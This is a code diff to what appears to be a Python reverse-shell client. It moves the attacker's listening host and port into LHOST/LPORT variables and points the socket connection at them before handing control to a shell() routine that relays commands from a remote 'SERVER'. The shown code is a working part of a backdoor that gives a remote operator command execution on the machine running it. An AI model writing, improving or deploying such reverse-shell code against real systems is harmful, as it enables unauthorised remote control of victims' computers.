@@ -5,6 +5,13 @@ import subprocess
 import os
 
 
+# **************************************************************************
+# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
+# **************************************************************************
+LHOST = '127.0.0.1'
+LPORT = 9001
+
+
 # json dumps the desired command, encodes it, and then sends it to the SERVER via socket's send function.
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -32,7 +39,7 @@ def connection():
             # **************************************************************************
             # ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
             # **************************************************************************
-            so.connect(('<ENTER LHOST IP HERE>', 5555))
+            so.connect((LHOST, LPORT))
             shell()
             so.close()
             break
